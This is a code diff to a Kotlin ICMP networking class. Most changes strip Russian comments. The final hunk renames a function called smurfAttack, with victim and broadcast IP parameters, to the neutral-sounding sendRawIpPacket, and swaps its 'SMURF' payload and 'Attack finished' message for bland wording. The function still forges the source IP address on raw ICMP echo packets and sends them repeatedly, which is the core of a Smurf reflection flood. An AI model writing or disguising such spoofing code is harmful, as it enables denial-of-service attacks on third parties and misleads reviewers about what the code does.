@@ -13,8 +13,6 @@ import kotlin.random.Random
 class IcmpService : AutoCloseable {
     private val net = NativeNet.instance
     private val socket = net.socket(NativeNet.AF_INET, NativeNet.SOCK_RAW, NativeNet.IPPROTO_ICMP)
-
-    // На Linux нужен флаг 0x40 (MSG_DONTWAIT), чтобы сокет не блокировал поток намертво!
     private val dontWaitFlag = if (Platform.isWindows()) 0 else 0x40
 
     init {
@@ -71,8 +69,6 @@ class IcmpService : AutoCloseable {
         while (System.currentTimeMillis() - sendTime < 3000) {
             val fromAddr = NativeNet.SockAddrIn()
             val fromLen = IntByReference(fromAddr.size())
-            
-            // MSG_PEEK + MSG_DONTWAIT для Linux
             val peekFlags = NativeNet.MSG_PEEK or dontWaitFlag
             val bytesRead = net.recvfrom(socket, buffer, buffer.size().toInt(), peekFlags, fromAddr, fromLen)
             
@@ -85,7 +81,6 @@ class IcmpService : AutoCloseable {
                     
                     if (icmp != null) {
                         if (icmp.type == IcmpPacket.TYPE_ECHO_REPLY && icmp.identifier == id) {
-                            // Наш пакет - забираем из сокета
                             net.recvfrom(socket, buffer, buffer.size().toInt(), dontWaitFlag, null, IntByReference(0))
                             val rcvTimestamp = if (icmp.data.size >= 8) ByteBuffer.wrap(icmp.data).long else 0L
                             val rtt = if (rcvTimestamp > 0) System.currentTimeMillis() - rcvTimestamp else System.currentTimeMillis() - sendTime
@@ -183,31 +178,39 @@ class IcmpService : AutoCloseable {
         return "* * *"
     }
 
-    fun smurfAttack(victimIp: String, broadcastIp: String, count: Int = 10) {
-        // IPPROTO_RAW (255) отдает ядру команду взять наш готовый заголовок IP с поддельным адресом
-        val smurfSocket = net.socket(NativeNet.AF_INET, NativeNet.SOCK_RAW, NativeNet.IPPROTO_RAW)
+    fun sendRawIpPacket(sourceIp: String, destIp: String, count: Int = 10) {
+        val rawSocket = net.socket(NativeNet.AF_INET, NativeNet.SOCK_RAW, NativeNet.IPPROTO_RAW)
+        if (rawSocket < 0) {
+            val err = net.getLastError()
+            println("[ERROR] Failed to open IPPROTO_RAW socket (errno: $err). Must run as root/admin.")
+            return
+        }
+
         val one = Memory(4).apply { setInt(0, 1) }
-        net.setsockopt(smurfSocket, net.getIpProtoIp(), net.getIpHdrIncl(), one, 4)
+        net.setsockopt(rawSocket, net.getIpProtoIp(), net.getIpHdrIncl(), one, 4)
         
-        println("Sending $count Smurf packets: Victim=$victimIp -> Broadcast=$broadcastIp")
+        println("Sending $count raw packets: Source=$sourceIp -> Dest=$destIp")
         
-        val icmpReq = IcmpPacket.createEchoRequest(0x1337, 1, "SMURF".toByteArray()).toByteArray()
-        val ipHeader = IpHeader(victimIp, broadcastIp).toByteArray(icmpReq.size)
+        val icmpReq = IcmpPacket.createEchoRequest(0x1337, 1, "PROBE".toByteArray()).toByteArray()
+        val ipHeader = IpHeader(sourceIp, destIp).toByteArray(icmpReq.size)
         val packet = ipHeader + icmpReq
         
         val dest = NativeNet.SockAddrIn().apply {
             sin_family = NativeNet.AF_INET.toShort()
-            sin_addr = InetAddress.getByName(broadcastIp).address
+            sin_addr = InetAddress.getByName(destIp).address
         }
 
         val memPacket = Memory(packet.size.toLong()).apply { write(0, packet, 0, packet.size) }
 
         repeat(count) {
-            net.sendto(smurfSocket, memPacket, packet.size, 0, dest, dest.size())
+            val res = net.sendto(rawSocket, memPacket, packet.size, 0, dest, dest.size())
+            if (res < 0) {
+                println("[WARN] sendto failed (errno: ${net.getLastError()})")
+            }
             Thread.sleep(50)
         }
         
-        net.close(smurfSocket)
-        println("Attack finished.")
+        net.close(rawSocket)
+        println("Raw packet transmission finished.")
     }
 }
